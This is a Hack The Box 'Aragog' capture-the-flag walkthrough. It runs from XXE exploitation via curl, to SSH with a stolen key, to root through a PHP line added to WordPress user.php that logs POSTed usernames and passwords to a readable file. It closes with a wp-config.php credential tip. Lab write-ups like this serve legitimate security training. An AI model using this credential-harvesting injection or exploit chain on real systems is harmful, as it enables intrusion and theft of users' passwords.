1-  First you've to enumerate the machine with [Nmap](</General Info/Tools/Enumeracion/Nmap.md>) and also use [GoBuster](</General Info/Tools/Enumeracion/GoBuster.md>) and [Wfuzz](</General Info/Tools/Enumeracion/Wfuzz.md>) in order to find some files of the page.
2 - After doing all this enumeration you'll find a `test.txt` file in the ftp with the anon user listed in Nmap. Another thing you could find is the file hosts.php with the [Wfuzz](</General Info/Tools/Enumeracion/Wfuzz.md>) tool. Once you've this two things you can combine them with the usage of curl to send a payload via a [XXE - XML External Entities Injection](</General Info/Tecnologias Web/Ataques/XXE - XML External Entities Injection.md>). The command you've to run is `curl -s -X POST -d @test.xml http://aragog.htb/hosts.php` in order to execute the curl tool in Silent mode, with the POST method and sending the content of the test.xml file as the body. The code that you should have in the test.xml file is in the [Aragog - Code](</HTB Machines/Code & Data/Aragog - Code.md>) resource.
3 - Once you've sent that payload you will get the id_rsa of the user __Florian__
4 - Now that you've used the id_rsa to get into the system via [SSH](</General Info/Tools/SSH.md>), you have to do some [Things to enumerate (Machine)](</General Info/Enumeration/Things to enumerate (Machine).md>). The thing that will pay off at the end is the usage of Pspy or the coding of a procmon tool to look for processes that run at a certain amount of time. The code can be seen in [Aragog - Code](</HTB Machines/Code & Data/Aragog - Code.md>).
5 - Once you've done this kind of enumeration you'll come acorss a certain tool called wp-login.py that's being executed regularly. Only the name gives us the idea that the script is making smth log into an account. Because of this behaviour and the fact that you've control over the Wordpress root directory you can intercept the credentials that are being sent by modifing the file user.php to make the login script create a file with the credentials that are being used to login the user in. The only thing that you've to do is add the following line in the part that looks if the credentials are being sent:
```
if (!empty($_POST['pwd']))
	$credentials['user_password'] = $_POST['pwd']
	
	file_put_contents("/var/www/html/dev_wiki/log.txt", $_POST['log'] . " : " . $_POST['pwd'], FILE_APPEND)  # INSERTED MALICIOUS CODE
```
The main purpose of this added line is to create a file called __log.txt__ that contains the user and password sent via the POST method with the script called `wp-login.py`.

6. Now that you've all set up the only thing that's left is wait. You can do it by running the command `watch -n 1 curl -s -X GET "http://aragog.htb/dev_wiki/log.txt"` and looking for the content of the file until it changes into the credentials of the Administrator user of the page.
7. The last thing of the machine is, because the user has the bad habit of reusing the credentials, issue the command `su root` and enter the password obtained from the previous exploit. Now you can freely go to `/root` and cat out the __root.txt__ file and go to `/home/florian` and also cat out the __user.txt__ file.

### Things to have in mind

- Sometimes when you compromise a machine that runs Wordpress, you can go on and look for the file __wp-config.php__ in the root wordpress directory and find valid credentials for the databases running on the server. 